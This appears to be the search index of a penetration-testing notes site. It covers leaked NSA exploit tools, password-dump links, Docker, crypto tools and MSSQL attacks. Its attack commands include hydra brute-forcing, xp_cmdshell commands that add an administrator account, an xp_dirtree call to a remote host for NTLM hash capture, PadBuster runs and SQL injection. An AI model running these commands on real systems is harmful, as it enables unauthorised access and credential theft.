GeZu/Commands/CommandLine/GeZu_KernelMemory_Command.xml) Gui N/A Resources used by the DanderSpirtz GUI LegacyWindowsExploits N/A Well.. Ops N/A Contains a lot of awesome tools and python / dss scripts used by DanderSpritz. Deserves a lot of investigation. includes tools to gather data from Chrome, Skype, Firefox (ripper) and gather information about the machine / environment (survey) Pfree Passfreely Oracle implant that bypasses auth for oracle databases PaCU PaperCut Allows you to perform operations on file handles opened by other processes Pc PeddleCheap The main implant (loaded via DoublePulsar) that performs all of these actions and communciates with the C2 (DanderSpirtz) Pc2.2 PeddleCheap Resources for PeddleCheap including different DLLs / configs to call back to the C2 Python N/A Python Libraries / resources being used ScRe ?? Interacts with SQL databases (based on ScRe/Commands/CommandLine/Sql_Command.xml) StLa Strangeland Keylogger (based on StLa/Tools/i386-winnt/strangeland.xsl) Tasking N/A Handles the collection \"tasks\" that DanderSpritz has requested on the same (collection of windows, network data, etc) TeDi TerritorialDispute A plugin used to determine what other (malicious) software may be persistently installed (based on TeDi/PyScripts/sigs.py). Appears to be used to identify other nation states also Utbu UtilityBurst Appears to be a mechanism for persistence via a driver install unsure (based on UtBu/Scripts/Include/_UtilityBurstFunctions.dsi) ZBng ZippyBang Looking at this quickly, it appears to be the NSA's version of Mimikatz. It can duplicate tokens (Kerberos tokens?) and \"remote execute commands\" as well as logon as users (based on files in ZBng/Commands/CommandLine) Exploits EARLYSHOVEL RedHat 7.0 - 7.1 Sendmail 8.11.x exploit EBBISLAND (EBBSHAVE) root RCE via RPC XDR overflow in Solaris 6, 7, 8, 9 10 (possibly newer) both SPARC and x86. ECHOWRECKER remote Samba 3.0.x Linux exploit. EASYBEE appears to be an MDaemon email server vulnerability EASYFUN EasyFun 2.2.0 Exploit for WDaemon / IIS MDaemon/WorldClient pre 9.5.6 EASYPI is an IBM Lotus Notes exploit that gets detected as Stuxnet EWOKFRENZY is an exploit for IBM Lotus Domino 6.5.4 7.0.2 EXPLODINGCAN is an IIS 6.0 exploit that creates a remote backdoor ETERNALROMANCE is a SMB1 exploit over TCP port 445 which targets XP, 2003, Vista, 7, Windows 8, 2008, 2008 R2, and gives SYSTEM privileges (MS17-010) EDUCATEDSCHOLAR is a SMB exploit (MS09-050) EMERALDTHREAD is a SMB exploit for Windows XP and Server 2003 (MS10-061) EMPHASISMINE is a remote IMAP exploit for IBM Lotus Domino 6.6.4 to 8.5.2 ENGLISHMANSDENTIST sets Outlook Exchange WebAccess rules to trigger executable code on the client's side to send an email to other users EPICHERO 0-day exploit (RCE) for Avaya Call Server ERRATICGOPHER is a SMBv1 exploit targeting Windows XP and Server 2003 ETERNALSYNERGY is a SMBv3 remote code execution flaw for Windows 8 and Server 2012 SP0 (MS17-010) ETERNALBLUE is a SMBv2 exploit for Windows 7 SP1 (MS17-010) ETERNALCHAMPION is a SMBv1 exploit ESKIMOROLL is a Kerberos exploit targeting 2000, 2003, 2008 and 2008 R2 domain controllers ESTEEMAUDIT is an RDP exploit and backdoor for Windows Server 2003 ECLIPSEDWING is an RCE exploit for the Server service in Windows Server 2008 and later (MS08-067) ETRE is an exploit for IMail 8.10 to 8.22 ETCETERABLUE is an exploit for IMail 7.04 to 8.05 FUZZBUNCH is an exploit framework, similar to MetaSploit ODDJOB is an implant builder and C C server that can deliver exploits for Windows 2000 and later, also not detected by any AV vendors EXPIREDPAYCHECK IIS6 exploit EAGERLEVER NBT/SMB exploit for Windows NT4.0, 2000, XP SP1 SP2, 2003 SP1 Base Release EASYFUN WordClient / IIS6.0 exploit ESSAYKEYNOTE EVADEFRED Utilities PASSFREELY utility which \"Bypasses authentication for Oracle servers\" SMBTOUCH check if the target is vulnerable to samba exploits like ETERNALSYNERGY, ETERNALBLUE, ETERNALROMANCE ERRATICGOPHERTOUCH Check if the target is running some RPC IISTOUCH check if the running IIS version is vulnerable RPCOUTCH get info about windows via RPC DOPU used to connect to machines exploited by ETERNALCHAMPIONS NAMEDPIPETOUCH Utility to test for a predefined list of named pipes, mostly AV detection. User can add checks for custom named pipes. Password Dumps http://scylla.sh http://scyllabyeatabumx.onion/ http://52.25.47.112/ Mirai https://github.com/danielmiessler/SecLists/blob/master/Passwords/Malware/mirai-botnet.txt https://github.com/securing/mirai_credentials Tomcat https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt Word-lists Parameters https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt References Conferences, documentaries, podcasts, word-lists, rainbow-tables: https://infocon.org/","title":"Collections"},{"location":"collections/#binaries","text":"Nmap: - https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/","title":"Binaries"},{"location":"collections/#leaked-datasets","text":"Disclaimer: These links are intended to be used by information security researchers who are interested in understanding the capabilities of frameworks/data-sets used in real-life. I am not responsible if you choose to use my work or this documentation to do something dumb and/or illegal.","title":"Leaked Datasets"},{"location":"collections/#shadowbroker","text":"https://www.comae.com/reports/us-17-Suiche-TheShadowBrokers-Cyber-Fear-Game-Changers-wp.pdf https://swithak.github.io/SH20TAATSB18/Study/AnalysesANDProfiles/TSB-ZeroNet/ https://lostar.com.tr/2017/04/nsa-hepimizi-izliyor.html https://www.revolvy.com/page/The-Shadow-Brokers EQGRP Lost in Translation References: [MUSTREAD]: Buckeye: Espionage Outfit Used Equation Group Tools Prior to Shadow Brokers Leak Confirmed: Leaked Equation Group Hacking Tools Are Real https://www.symantec.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit https://github.com/misterch0c/shadowbroker DanderSpritz https://github.com/francisck/DanderSpritz_docs DanderSpritz Setup - https://danderspritz.com/ DSky Darkskyline PacketCapture tool DaPu DarkPulsar Appears to be a legacy implant, similar to PeddleCheap but older Darkskyline DarkSkyline Contains tools to parse and filter traffic captured by DarkSkyline DeMI DecibelMinute Appears to interact with KillSuit to install, configure, and uninstall it Df DoubleFeature Generates a log report about the types of tools that could be deployed on the target. A lot of tools mention that doublefeature is the only way to confirm their existence DmGZ DoormanGauze DoormanGauze is a kernel level network driver that appears to bypass the standard Windows TCP/IP stack Dsz DanderSpritz Several DanderSpritz specific files such as command descriptions (in XML), and several scripts with DSS (Debug script interface?) / DSI extensions?. They seem to be scripts run by DanderSpritz Ep ExpandingPulley Listening Post developed in 2001 and abandoned in 2008. Predecessor to DanderSpritz ExternalLibraries N/A Well.. FlAv FlewAvenue Appears related to DoormanGauze (based on FlAv/scripts/_FlewAvenue.txt) GRDO GreaterDoctor Appears to parse / process from GreaterSurgeon (based on GRDO/Tools/i386/GreaterSurgeon_postProcess.py analyzeMFT.py) GROK ?? Appears to be a keylogger (based on Ops/PyScripts/overseer/plugins/keylogger.py) GRcl ?? Appears to dump memory from a specific process (based on GRcl/Commands/CommandLine/ProcessMemory_Command.xml) GaTh GangsterTheif Appears to parse data gathered by GreaterDoctor to identify other (malicious) software that may be installed persistently (based on GaTh/Commands/CommandLine/GrDo_ProcessScanner_Command.xml) GeZU GreaterSurgeon Appears to dump memory (based on GeZu/Commands/CommandLine/GeZu_KernelMemory_Command.xml) Gui N/A Resources used by the DanderSpirtz GUI LegacyWindowsExploits N/A Well.. Ops N/A Contains a lot of awesome tools and python / dss scripts used by DanderSpritz. Deserves a lot of investigation. includes tools to gather data from Chrome, Skype, Firefox (ripper) and gather information about the machine / environment (survey) Pfree Passfreely Oracle implant that bypasses auth for oracle databases PaCU PaperCut Allows you to perform operations on file handles opened by other processes Pc PeddleCheap The main implant (loaded via DoublePulsar) that performs all of these actions and communciates with the C2 (DanderSpirtz) Pc2.2 PeddleCheap Resources for PeddleCheap including different DLLs / configs to call back to the C2 Python N/A Python Libraries / resources being used ScRe ?? Interacts with SQL databases (based on ScRe/Commands/CommandLine/Sql_Command.xml) StLa Strangeland Keylogger (based on StLa/Tools/i386-winnt/strangeland.xsl) Tasking N/A Handles the collection \"tasks\" that DanderSpritz has requested on the same (collection of windows, network data, etc) TeDi TerritorialDispute A plugin used to determine what other (malicious) software may be persistently installed (based on TeDi/PyScripts/sigs.py). Appears to be used to identify other nation states also Utbu UtilityBurst Appears to be a mechanism for persistence via a driver install unsure (based on UtBu/Scripts/Include/_UtilityBurstFunctions.dsi) ZBng ZippyBang Looking at this quickly, it appears to be the NSA's version of Mimikatz. It can duplicate tokens (Kerberos tokens?) and \"remote execute commands\" as well as logon as users (based on files in ZBng/Commands/CommandLine) Exploits EARLYSHOVEL RedHat 7.0 - 7.1 Sendmail 8.11.x exploit EBBISLAND (EBBSHAVE) root RCE via RPC XDR overflow in Solaris 6, 7, 8, 9 10 (possibly newer) both SPARC and x86. ECHOWRECKER remote Samba 3.0.x Linux exploit. EASYBEE appears to be an MDaemon email server vulnerability EASYFUN EasyFun 2.2.0 Exploit for WDaemon / IIS MDaemon/WorldClient pre 9.5.6 EASYPI is an IBM Lotus Notes exploit that gets detected as Stuxnet EWOKFRENZY is an exploit for IBM Lotus Domino 6.5.4 7.0.2 EXPLODINGCAN is an IIS 6.0 exploit that creates a remote backdoor ETERNALROMANCE is a SMB1 exploit over TCP port 445 which targets XP, 2003, Vista, 7, Windows 8, 2008, 2008 R2, and gives SYSTEM privileges (MS17-010) EDUCATEDSCHOLAR is a SMB exploit (MS09-050) EMERALDTHREAD is a SMB exploit for Windows XP and Server 2003 (MS10-061) EMPHASISMINE is a remote IMAP exploit for IBM Lotus Domino 6.6.4 to 8.5.2 ENGLISHMANSDENTIST sets Outlook Exchange WebAccess rules to trigger executable code on the client's side to send an email to other users EPICHERO 0-day exploit (RCE) for Avaya Call Server ERRATICGOPHER is a SMBv1 exploit targeting Windows XP and Server 2003 ETERNALSYNERGY is a SMBv3 remote code execution flaw for Windows 8 and Server 2012 SP0 (MS17-010) ETERNALBLUE is a SMBv2 exploit for Windows 7 SP1 (MS17-010) ETERNALCHAMPION is a SMBv1 exploit ESKIMOROLL is a Kerberos exploit targeting 2000, 2003, 2008 and 2008 R2 domain controllers ESTEEMAUDIT is an RDP exploit and backdoor for Windows Server 2003 ECLIPSEDWING is an RCE exploit for the Server service in Windows Server 2008 and later (MS08-067) ETRE is an exploit for IMail 8.10 to 8.22 ETCETERABLUE is an exploit for IMail 7.04 to 8.05 FUZZBUNCH is an exploit framework, similar to MetaSploit ODDJOB is an implant builder and C C server that can deliver exploits for Windows 2000 and later, also not detected by any AV vendors EXPIREDPAYCHECK IIS6 exploit EAGERLEVER NBT/SMB exploit for Windows NT4.0, 2000, XP SP1 SP2, 2003 SP1 Base Release EASYFUN WordClient / IIS6.0 exploit ESSAYKEYNOTE EVADEFRED Utilities PASSFREELY utility which \"Bypasses authentication for Oracle servers\" SMBTOUCH check if the target is vulnerable to samba exploits like ETERNALSYNERGY, ETERNALBLUE, ETERNALROMANCE ERRATICGOPHERTOUCH Check if the target is running some RPC IISTOUCH check if the running IIS version is vulnerable RPCOUTCH get info about windows via RPC DOPU used to connect to machines exploited by ETERNALCHAMPIONS NAMEDPIPETOUCH Utility to test for a predefined list of named pipes, mostly AV detection. User can add checks for custom named pipes.","title":"Shadowbroker"},{"location":"collections/#password-dumps","text":"http://scylla.sh http://scyllabyeatabumx.onion/ http://52.25.47.112/ Mirai https://github.com/danielmiessler/SecLists/blob/master/Passwords/Malware/mirai-botnet.txt https://github.com/securing/mirai_credentials Tomcat https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt","title":"Password Dumps"},{"location":"collections/#word-lists","text":"Parameters https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt","title":"Word-lists"},{"location":"collections/#references","text":"Conferences, documentaries, podcasts, word-lists, rainbow-tables: https://infocon.org/","title":"References"},{"location":"container/","text":"Docker General Commands Mount host file system into a container and run: docker run --rm -ti -v /:/hostOs image sh Auto remove container when exit: docker run --rm List all images: docker images --all Enumeration Check presence of docker: / . dockerenv Tools binctr Create fully static, including rootfs embedded, binaries that pop you directly into a container. Can be run by an unprivileged user. https://github.com/genuinetools/binctr https://blog.ropnop.com/docker-for-pentesters/ CVE-2019-5736 https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/ https://gist.github.com/singe/0ad4078848d85dc0d03f9f9013796e45 New References Security analysis of Docker containers in a production environment Cryptojacking invades cloud. How modern containerization trend is exploited by attackers","title":"Container"},{"location":"container/#docker","text":"","title":"Docker"},{"location":"container/#general-commands","text":"Mount host file system into a container and run: docker run --rm -ti -v /:/hostOs image sh Auto remove container when exit: docker run --rm List all images: docker images --all","title":"General Commands"},{"location":"container/#enumeration","text":"Check presence of docker: / . dockerenv","title":"Enumeration"},{"location":"container/#tools","text":"","title":"Tools"},{"location":"container/#binctr","text":"Create fully static, including rootfs embedded, binaries that pop you directly into a container. Can be run by an unprivileged user. https://github.com/genuinetools/binctr https://blog.ropnop.com/docker-for-pentesters/","title":"binctr"},{"location":"container/#cve-2019-5736","text":"https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/ https://gist.github.com/singe/0ad4078848d85dc0d03f9f9013796e45","title":"CVE-2019-5736"},{"location":"container/#new-references","text":"Security analysis of Docker containers in a production environment Cryptojacking invades cloud. How modern containerization trend is exploited by attackers","title":"New References"},{"location":"crypto/","text":"Tools Compare unknown cipher against ACA cipher types: http://web.archive.org/web/20120624074941/http://home.comcast.net/~acabion/refscore.html Crypto Operations: http://rumkin.com/tools/cipher/ RsaCtfTool: https://github.com/Ganapati/RsaCtfTool RsaCtfTool.py --publickey public-key.pub --uncipher cipher-text.crypt One time pad decipher: https://www.braingle.com/brainteasers/codes/onetimepad.php#form Ceasar Cipher: https://www.xarg.org/tools/caesar-cipher/ Ceaser Decode: echo string | tr [A-Za-z] [N-ZA-Mn-za-m] Vigenere Cipher: https://www.dcode.fr/vigenere-cipher Elliptic Curve Cryptography for Python: https://pypi.org/project/seccure/ PadBuster Padding Oracle Attack https://github.com/GDSSecurity/PadBuster https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html Decrypt: padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth = 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 Encrypt padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth = 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 -plaintext user = admin OpenSSL General Extracting Public Key - Using private key: openssl pkey - in example . key - pubout Extracting Public Key - From certificate: openssl x509 - in example . crt - pubkey - noout CSR and Signing Create CSR and private key openssl req -new -newkey rsa:2048 -nodes -keyout example.key -out example.csr #OR openssl genrsa -out example.key 2048 openssl req -new -key example.key -out example.csr Check CSR openssl req -verify -in example.csr -text -noout Sign CSR enforcing SHA256 openssl x509 -req -days 360 -in example.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out example.crt -sha256 Self-sign openssl x509 -req -days 365 -in example.csr -signkey example.key -out example.crt CA-sign openssl x509 -req -in example.csr -CA ca.crt -CAkey ca.key -set_serial 9999 -extensions client -days 9999 -outform PEM -out example.crt Create P12 openssl pkcs12 -export -clcerts -in server.crt -inkey server.key -out cert.p12 Encoding/Decoding IP to Decimal: https://www.browserling.com/tools/ip-to-dec Binary to ASCII: echo 010000 | perl -lpe $_=pack B* ,$_ Ook and Brainfuck https://www.splitbrain.org/_static/ook/ https://www.splitbrain.org/services/ook https://github.com/splitbrain/ook Base64 Decode: base64 -d NmQy echo NmQy | base64 -d Base64 Encode: base64 NmQy echo NmQy | base64 Hashes https://hashkiller.co.uk Concurrency Multi-threaded CPU miner: https://github.com/hyc/cpuminer-multi References How to create a self-signed SSL Certificate How to Set Up Mutual TLS Authentication to Protect Your Admin Console MD5 collisions of any pair of PDFs: https://twitter.com/angealbertini/status/1075417521799528448","title":"Crypto"},{"location":"crypto/#tools","text":"Compare unknown cipher against ACA cipher types: http://web.archive.org/web/20120624074941/http://home.comcast.net/~acabion/refscore.html Crypto Operations: http://rumkin.com/tools/cipher/ RsaCtfTool: https://github.com/Ganapati/RsaCtfTool RsaCtfTool.py --publickey public-key.pub --uncipher cipher-text.crypt One time pad decipher: https://www.braingle.com/brainteasers/codes/onetimepad.php#form Ceasar Cipher: https://www.xarg.org/tools/caesar-cipher/ Ceaser Decode: echo string | tr [A-Za-z] [N-ZA-Mn-za-m] Vigenere Cipher: https://www.dcode.fr/vigenere-cipher Elliptic Curve Cryptography for Python: https://pypi.org/project/seccure/","title":"Tools"},{"location":"crypto/#padbuster","text":"Padding Oracle Attack https://github.com/GDSSecurity/PadBuster https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html Decrypt: padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth = 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 Encrypt padbuster http://10.10.10.18 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO 8 -cookies auth = 2zKLNWhe0Xt7G4ymYDK%2BEdptckP8a8vO -encoding 0 -plaintext user = admin","title":"PadBuster"},{"location":"crypto/#openssl","text":"","title":"OpenSSL"},{"location":"crypto/#general","text":"Extracting Public Key - Using private key: openssl pkey - in example . key - pubout Extracting Public Key - From certificate: openssl x509 - in example . crt - pubkey - noout","title":"General"},{"location":"crypto/#csr-and-signing","text":"Create CSR and private key openssl req -new -newkey rsa:2048 -nodes -keyout example.key -out example.csr #OR openssl genrsa -out example.key 2048 openssl req -new -key example.key -out example.csr Check CSR openssl req -verify -in example.csr -text -noout Sign CSR enforcing SHA256 openssl x509 -req -days 360 -in example.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out example.crt -sha256 Self-sign openssl x509 -req -days 365 -in example.csr -signkey example.key -out example.crt CA-sign openssl x509 -req -in example.csr -CA ca.crt -CAkey ca.key -set_serial 9999 -extensions client -days 9999 -outform PEM -out example.crt Create P12 openssl pkcs12 -export -clcerts -in server.crt -inkey server.key -out cert.p12","title":"CSR and Signing"},{"location":"crypto/#encodingdecoding","text":"IP to Decimal: https://www.browserling.com/tools/ip-to-dec Binary to ASCII: echo 010000 | perl -lpe $_=pack B* ,$_ Ook and Brainfuck https://www.splitbrain.org/_static/ook/ https://www.splitbrain.org/services/ook https://github.com/splitbrain/ook Base64 Decode: base64 -d NmQy echo NmQy | base64 -d Base64 Encode: base64 NmQy echo NmQy | base64","title":"Encoding/Decoding"},{"location":"crypto/#hashes","text":"https://hashkiller.co.uk","title":"Hashes"},{"location":"crypto/#concurrency","text":"Multi-threaded CPU miner: https://github.com/hyc/cpuminer-multi","title":"Concurrency"},{"location":"crypto/#references","text":"How to create a self-signed SSL Certificate How to Set Up Mutual TLS Authentication to Protect Your Admin Console MD5 collisions of any pair of PDFs: https://twitter.com/angealbertini/status/1075417521799528448","title":"References"},{"location":"databases-sqlserver/","text":"Quick Reference mssql-sql-injection-cheat-sheet: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet Brute-forcing: hydra - l sa \u2013 P / path / to / rockyou . txt 10 . 10 . 10 . 125 mssql Nmap Enumeration: nmap \u2013script ms-sql and not ms-sql-brute \u2013script-args=mssql.username=sa,mssql.password=password,ms-sql-config.showall=true,ms-sql-tables.maxdb=0,ms-sql-tables.maxtables=0,ms-sql-xp-cmdshell.cmd=ipconfig /all -d -oN mssql.nmap -Pn -v -sV \u2013version-intensity 9 -T2 -p T:27900,U:1434 10 .33.1.33 nmap -sV -T2 -Pn -n -sS \u2013script = ms-sql-xp-cmdshell.nse -p1433 \u2013script-args mssql.username = sa,mssql.password = poiuytrewq,ms-sql-xp-cmdshell.cmd = net user walter P@ssWORD1234 /add 10 .33.1.33 nmap -sV -T2 -Pn -n -sS \u2013script = ms-sql-xp-cmdshell.nse -p1433 \u2013script-args mssql.username = sa,mssql.password = poiuytrewq,ms-sql-xp-cmdshell.cmd = net localgroup administrators walter /add 10 .33.1.33 nmap -v -sV \u2013version-intensity 9 -T2 -p T:27900,U:1433 \u2013script ms-sql-query \u2013script-args mssql.username = sa,mssql.password = password,mssql.database = bankdb,ms-sql-query.query = SELECT * FROM tblCustomers 10 .33.1.33 nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port = 1433 ,mssql.username = sa,mssql.password = ,mssql.instance-name = MSSQLSERVER $ip Capture hash: Run responder and do: xp_dirtree \\\\10.10.14.8\\test List all databases EXEC sp_databases ; select * from sysobjects where xtype = U ; Connect from Linux: sqsh - S someserver - U sa - P poiuytrewq - D bankdb Special Schemas: INFORMATION_SCHEMA sys DB Structure: SELECT name FROM master . dbo . sysdatabases SELECT * FROM orcharddb . INFORMATION_SCHEMA . SELECT * FROM orcharddb . INFORMATION_SCHEMA . COLUMNS SQL Injection Tips: Commenting: -- Important functions xp_dirtree - undocumented MSSQL stored procedure that allows for interaction with local and remote filesystems +EXEC+master.sys.xp_dirtree+ \\\\ 10 . 10 . 14 . 9 \\ share -- Time based injection if (select user) = sa waitfor delay 0 : 0 : 5 -- if (select user) != sa waitfor delay 0 : 0 : 5 -- Tools SQSH Accessing and Hacking MSSQL from Backtrack Linux Installation: apt - get install sqsh freetds - bin freetds - common freetds - dev Edit / etc / freetds / freetds . conf , and append: [MyServer] host = 192.168.1.10 port = 1433 tds version = 8.0 Optionally edit ~/ . sqshrc : \\ set username = sa \\ set password = password \\ set style = vert Run: sqsh - S MyServer sqsh - S { system name / IP } : { port num } - U { username } - P { password } List of available databases with: SELECT name FROM master .. sysdatabases go Build from source: $export SYBASE = /usr/local/freetds $ ./configure $ make $ su # make install # ls -l /usr/local/bin/sqsh # ls -l /usr/local/bin/sqsh.bin Roles and Permissions Principals Principals are entities that can request SQL Server resources. SQL Server-level principals: SQL Server authentication Login sa Created when instance is installed Default database is master Member of sysadmin database role public Every login belongs to the this role Windows authentication login for a Windows user Windows authentication login for a Windows group Azure Active Directory authentication login for a AD user Azure Active Directory authentication login for a AD group Server Role Database-level principals: Database User (There are 11 types of users. For more information, see CREATE USER.) dbo Created for each database Has all permissions in the database Owns dbo schema ( dbo schema is the default schema for all users, and cannot be dropped) guest Permissions granted are inherited by users who have access to the database, but who do not have a user account in the database. Cannot be dropped Can be disabled by revoking it's CONNECT permission ( REVOKE CONNECT FROM GUEST ; ) Database Role Application Role Server-Level Roles and Permissions Fixed Roles sysadmin - Can perform any activity in the server. serveradmin - Can change server-wide configuration options and shut down the server. securityadmin Manage logins and their properties. Can GRANT, DENY, and REVOKE server-level permissions. Can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database. Can reset passwords for SQL Server logins. Should be treated as equivalent to the sysadmin role. processadmin - Can end processes that are running in an instance of SQL Server. setupadmin - Can add and remove linked servers by using Transact-SQL statements (sysadmin membership is needed when using Management Studio.) bulkadmin - Can run the BULK INSERT statement. diskadmin - Used for managing disk files. dbcreator - Can create, alter, drop, and restore any database. public Every SQL Server login belongs to the public server role. When a server principal has not been granted or denied specific permissions on a securable object, the user inherits the permissions granted to public on that object. Only assign public permissions on any object when you want the object to be available to all users. You cannot change membership in public. Public is implemented differently than other roles, and permissions can be granted, denied, or revoked from the public fixed server roles. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017 Working with Server-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles Database Level Roles and Permissions CREATE LOGIN ... WITH PASSWORD = ...; Fixed Roles db_owner Can perform all configuration and maintenance activities on the database. Can drop the database in SQL Server. (In SQL Database and SQL Data Warehouse, some maintenance activities require server-level permissions and cannot be performed by db_owners) db_securityadmin Can modify role membership and manage permissions. Adding principals to this role could enable unintended privilege escalation. db_accessadmin Can add or remove access to the database for Windows logins, Windows groups, and SQL Server logins. db_backupoperator - Can back up the database. db_ddladmin - Can run any Data Definition Language (DDL) command. db_datawriter - Can add, delete, or change data in all user tables. db_datareader - Can read all data from all user tables. db_denydatawriter - Cannot add, modify, or delete any data in the user tables within a database. db_denydatareader - Cannot read any data in the user tables within a database. Fixed Roles and Permissions https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017 Special Roles for SQL Database and SQL Data Warehouse Exist only in the virtual master database. Permissions are restricted to actions performed in master. Only database users in master can be added to these roles. Logins cannot be added to these roles, but users can be created based on logins and then those users can be added to the roles. Contained database users in master, can also be added to these roles. dbmanager Can create and delete databases. A member of the dbmanager role that creates a database, becomes the owner of that databasee which allows that user to connect to that database as the dbo user. The dbo user has all database permissions in the database. Members of the dbmanager role do not necessarily have permission to access databases that they do not own. loginmanager - Can create and delete logins in the virtual master database. Special Roles for msdb Database db_ssisadmin db_ssisoperator db_ssisltduser Can administer and use SSIS. Instances of SQL Server that are upgraded from an earlier version might contain an older version of the role that was named using Data Transformation Services (DTS) instead of SSIS. db_ssisadmin - may be able to elevate their privileges to sysadmin [1] dc_admin dc_operator dc_proxy - Can administer and use the data collector. dc_admin may be able to elevate their privileges to sysadmin . [1] PolicyAdministratorRole Can perform all configuration and maintenance activities on Policy-Based Management policies and conditions. ServerGroupAdministratorRole ServerGroupReaderRole - Can administer and use registered server groups. dbm_monitor Created in the msdb database when the first database is registered in Database Mirroring Monitor . Has no members until a system administrator assigns users to the role. [1] These roles can modify Integration Services packages and Integration Services packages can be executed by SQL Server using the sysadmin security context of SQL Server Agent. To guard against this elevation of privilege when running maintenance plans, data collection sets, and other Integration Services packages, configure SQL Server Agent jobs that run packages to use a proxy account with limited privileges or only add sysadmin members to the db_ssisadmin and dc_admin roles. https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles Special Roles for R Services rpkgs - users - Allows using any shared packages that were installed by members of the rpkgs-shared role. rpkgs - private Provides access to shared packages with the same permissions as the rpkgs-users role. Members of this role can also install, remove and use privately scoped packages. rpkgs - shared Provides the same permissions as the rpkgs-private role. Users who are members of this role can also install or remove shared packages. Working with Database-Level Roles https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles Application Roles Enable access to specific data to only those users who connect through a particular application. Enabled by using sp_setapprole Enumeration Direct Access SQLPS module SQL Server Management Modules (SMO) .NET (System.Data.SQL / System.Data.SQLClient) Modules PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Discovery PowerUpSQL: Get - SQLInstanceScanUDP - ComputerName 192 . 168 . 1 . 2 - verbose .NET (UDP Broadcast): [ System . Data . Sql . SqlDataSourceEnumeration ]:: Instance . GetDataSources () Local Enumeration http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/ Import-Module -Name SQLPS Get-ChildItem SQLSERVER : \\ SQL \\ machinename Get-Service -Name MSSQL * sqlinstances = Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server foreach ( $SQLInstance in $SQLInstances ) { foreach ( $s in $SQLInstance . InstalledInstances ) { [PSCustomObject] @{ PSComputerName = $SQLInstance . PSComputerName InstanceName = $s }}} Get-SQLInstanceLocal Domain Enumeration Search AD user attribute: servicePrincipalName = MSSQL * Import-Module -Name PowerUpSQL Get-SQLInstanceDomain -verbose Looking for interesting databases Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance -verbose | select -ExpandProperty DatabaseName Get-SQLDatabaseThreaded -Threads 10 -Username sa -Password pw -Instance instance | Where-Object { $_ . is_encrypted -eq \u201c True } Get-SQLColumnSampleDataThreaded -Threads 10 -Keywords password, credit -SampleSize 5 -ValidateCC -NoDefaults -Username sa -Password pw -Instance instance -Verbose Queries Version: SELECT @@version Current User: SELECT SUSER_SNAME () SELECT SYSTEM_USER Current Role: SELECT IS_SRVROLEMEMBER ( sysadmin ) SELECT user Current Database: SELECT db_name () List All Databases: SELECT name FROM master .. sysdatabases List All Logins: SELECT - FROM sys . server_principals WHERE type_desc != SERVER_ROLE List All Users for Database: SELECT - FROM sys . database_principals WHERE type_desc != DATABASE_ROLE List All Sysadmins: SELECT name , type_desc , is_disabled FROM sys . server_principals WHERE IS_SRVROLEMEMBER ( sysadmin , name ) = 1 List All Roles: SELECT DP1 . name AS DatabaseRoleName , isnull ( DP2 . name , No members ) AS DatabaseUserName FROM sys . database_role_members AS DRM RIGHT OUTER JOIN sys . database_principals AS DP1 ON DRM . role_principal_id = DP1 . principal_id LEFT OUTER JOIN sys . database_principals AS DP2 ON DRM . member_principal_id = DP2 . principal_id WHERE DP1 . type = R ORDER BY DP1 . name ; Effective Permissions for Server: SELECT - FROM fn_my_permissions ( NULL , SERVER ); Effective Permissions for Database: SELECT - FROM fn_my_permissions ( NULL , DATABASE ); Active User Tokens: SELECT - FROM sys . user_token Active Login Tokens: SELECT - FROM sys . login_token Impersonatable Accounts: SELECT distinct b . name FROM sys . server_permissions a INNER JOIN sys . server_principals b ON a . grantor_principal_id = b . principal_id WHERE a . permission_name = IMPERSONATE Find Trustworthy Databases: SELECT name as database_name , SUSER_NAME ( owner_sid ) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys . databases https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql Brute-forcing Check if current domain user has access to DB Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Check if another domain user has access to DB runas / noprofile / netonly / user : domain \\ username powershell . exe 